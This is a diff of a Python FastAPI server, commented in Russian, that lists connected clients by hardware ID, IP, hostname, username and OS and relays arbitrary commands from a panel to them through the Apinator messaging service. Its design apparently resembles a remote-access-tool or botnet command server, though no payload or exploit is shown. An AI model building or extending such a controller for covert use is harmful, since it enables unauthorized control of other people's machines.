@@ -7,27 +7,26 @@ from pydantic import BaseModel
 from contextlib import asynccontextmanager
 import httpx
 
-# ========== Конфигурация Apinator ==========
-APINATOR_KEY = os.environ.get("APINATOR_KEY")       # публичный ключ (для чтения)
-APINATOR_SECRET = os.environ.get("APINATOR_SECRET") # секретный ключ (для публикации)
-APINATOR_API_URL = "https://api.apinator.com"       # реальный URL из документации
-APINATOR_WS_URL = "wss://ws.apinator.com"           # реальный URL из документации
+# ===== Конфигурация Apinator =====
+APINATOR_KEY = os.environ.get("APINATOR_KEY")
+APINATOR_SECRET = os.environ.get("APINATOR_SECRET")
+APINATOR_API_URL = "https://api.apinator.com"
+APINATOR_WS_URL = "wss://ws.apinator.com"
 
 if not APINATOR_KEY or not APINATOR_SECRET:
     raise RuntimeError("Apinator credentials not set")
 
-# ========== Состояние сервера ==========
-clients_info = {}  # hwid -> { "ip": ..., "hostname": ..., "username": ..., "os": ... }
+# ===== Состояние сервера =====
+clients_info = {}
 lock = asyncio.Lock()
 
-# ========== Модели для API ==========
+# ===== Модели =====
 class CommandRequest(BaseModel):
     target: str
     command: dict
 
-# ========== Вспомогательные функции ==========
+# ===== Вспомогательные функции =====
 async def publish_to_apinator(channel: str, message: dict):
-    """Отправляет сообщение в канал Apinator через REST API"""
     async with httpx.AsyncClient() as client:
         resp = await client.post(
             f"{APINATOR_API_URL}/publish",
@@ -44,19 +43,15 @@ async def publish_to_apinator(channel: str, message: dict):
         return resp.json()
 
 async def send_to_client(hwid: str, command: dict):
-    """Отправляет команду клиенту через его приватный канал"""
-    channel = f"client_{hwid}"
-    await publish_to_apinator(channel, command)
+    await publish_to_apinator(f"client_{hwid}", command)
 
-# ========== Фоновая задача: подписка на события Apinator ==========
+# ===== Фоновая задача =====
 async def apinator_listener():
-    """Слушает глобальный канал присутствия и обновляет список клиентов"""
     import websockets
     uri = f"{APINATOR_WS_URL}?key={APINATOR_KEY}&secret={APINATOR_SECRET}"
     while True:
         try:
             async with websockets.connect(uri) as ws:
-                # Подписываемся на канал присутствия (все клиенты)
                 await ws.send(json.dumps({"event": "subscribe", "channel": "presence_global"}))
                 async for message in ws:
                     data = json.loads(message)
@@ -64,33 +59,30 @@ async def apinator_listener():
                     if event == "client_connected":
                         hwid = data.get("data", {}).get("hwid")
                         if hwid:
-                            ip = data.get("data", {}).get("ip", "Unknown")
-                            hostname = data.get("data", {}).get("hostname", "Unknown")
-                            username = data.get("data", {}).get("username", "Unknown")
-                            os = data.get("data", {}).get("os", "Unknown")
                             async with lock:
-                                clients_info[hwid] = {"ip": ip, "hostname": hostname, "username": username, "os": os}
+                                clients_info[hwid] = {
+                                    "ip": data.get("data", {}).get("ip", "Unknown"),
+                                    "hostname": data.get("data", {}).get("hostname", "Unknown"),
+                                    "username": data.get("data", {}).get("username", "Unknown"),
+                                    "os": data.get("data", {}).get("os", "Unknown")
+                                }
                     elif event == "client_disconnected":
                         hwid = data.get("data", {}).get("hwid")
                         if hwid:
                             async with lock:
                                 clients_info.pop(hwid, None)
-                    # Можно также обрабатывать обновление информации о клиенте
-        except Exception as e:
-            print(f"Apinator listener error: {e}")
+        except Exception:
             await asyncio.sleep(5)
 
-# ========== FastAPI приложение ==========
+# ===== FastAPI =====
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Запускаем слушатель событий
     task = asyncio.create_task(apinator_listener())
     yield
     task.cancel()
 
 app = FastAPI(lifespan=lifespan)
 
-# ========== HTTP эндпоинты ==========
 @app.get("/")
 async def index():
     return {"status": "OK"}
@@ -101,27 +93,23 @@ async def health():
 
 @app.get("/clients")
 async def get_clients():
-    """Возвращает список активных клиентов"""
     async with lock:
         return list(clients_info.values())
 
 @app.post("/command")
 async def send_command(req: CommandRequest):
-    """Принимает команду от панели и отправляет её клиенту через Apinator"""
     try:
         await send_to_client(req.target, req.command)
         return {"status": "ok", "message": "command sent"}
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-# ========== WebSocket (заглушка, т.к. используем Apinator) ==========
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     await websocket.send_text("WebSocket on server is deprecated. Use Apinator.")
     await websocket.close()
 
-# ========== Запуск ==========
 if __name__ == "__main__":
     import uvicorn
     port = int(os.environ.get("PORT", 8000))
